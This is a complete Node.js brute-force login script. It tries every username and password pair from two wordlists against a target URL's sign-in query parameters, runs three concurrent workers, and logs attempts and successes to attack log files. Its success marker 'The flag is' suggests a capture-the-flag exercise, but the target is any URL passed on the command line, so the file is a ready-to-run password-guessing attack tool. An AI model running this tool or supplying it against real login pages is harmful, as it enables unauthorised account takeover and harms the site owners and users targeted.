const fs = require('fs');
const axios = require('axios');
const { promisify } = require('util');
const sleep = promisify(setTimeout);
const path = require('path');

// Configuration
const LOGIN_SUCCESS_INDICATOR = "The flag is";
const REQUEST_DELAY_MS = 50;
const MAX_CONCURRENT_REQUESTS = 3;
const LOG_DIR = './attack_logs';

// Ensure log directory exists
if (!fs.existsSync(LOG_DIR)) {
    fs.mkdirSync(LOG_DIR);
}

// Create timestamped log file
const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
const logFilePath = path.join(LOG_DIR, `attack_${timestamp}.log`);
const successFilePath = path.join(LOG_DIR, `success_${timestamp}.log`);

// Initialize log files
fs.writeFileSync(logFilePath, `Attack started at ${new Date().toISOString()}\n\n`);
fs.writeFileSync(successFilePath, `Successful logins:\n\n`);

async function logToFile(filePath, message) {
    fs.appendFileSync(filePath, `${message}\n`);
}

async function testCredentials(url, username, password) {
    try {
        const response = await axios.get(`${url}?page=signin&username=${username}&password=${password}&Login=Login#`);
        const logMessage = `[ATTEMPT] ${new Date().toISOString()} - ${username}:${password}`;

        if (response.data.includes(LOGIN_SUCCESS_INDICATOR)) {
            const successMessage = `[SUCCESS] ${new Date().toISOString()} - ${username}:${password}`;
            logToFile(logFilePath, `${logMessage} - SUCCESS`);
            logToFile(successFilePath, successMessage);
            return true;
        } else {
            logToFile(logFilePath, `${logMessage} - FAILURE`);
            return false;
        }
    } catch (error) {
        const errorMessage = `[ERROR] ${new Date().toISOString()} - ${username}:${password} - ${error.message}`;
        logToFile(logFilePath, errorMessage);
        return false;
    }
}

async function processFiles(targetUrl, usersFile, passwordsFile) {
    try {
        const users = fs.readFileSync(usersFile, 'utf8').split('\n').filter(u => u.trim());
        const passwords = fs.readFileSync(passwordsFile, 'utf8').split('\n').filter(p => p.trim());

        logToFile(logFilePath, `Loaded ${users.length} users and ${passwords.length} passwords`);

        const queue = [];
        for (const user of users) {
            for (const password of passwords) {
                queue.push({ user, password });
            }
        }

        logToFile(logFilePath, `Total attempts to make: ${queue.length}`);

        const worker = async () => {
            while (queue.length > 0) {
                const { user, password } = queue.pop();
                await testCredentials(targetUrl, user, password);
                await sleep(REQUEST_DELAY_MS);
            }
        };

        await Promise.all(
            Array(Math.min(MAX_CONCURRENT_REQUESTS, queue.length))
                .fill()
                .map(worker)
        );

        logToFile(logFilePath, `\nAttack completed at ${new Date().toISOString()}`);
    } catch (error) {
        logToFile(logFilePath, `[FATAL ERROR] ${new Date().toISOString()} - ${error.message}`);
        throw error;
    }
}

// Main execution
if (process.argv.length !== 5) {
    console.log("Usage: node login_tester.js <target_url> <users_file> <passwords_file>");
    process.exit(1);
}

const [, , targetUrl, usersFile, passwordsFile] = process.argv;
processFiles(targetUrl, usersFile, passwordsFile)
    .then(() => console.log(`Attack completed. Check ${LOG_DIR} for results.`))
    .catch(err => console.error(`Error: ${err.message}`));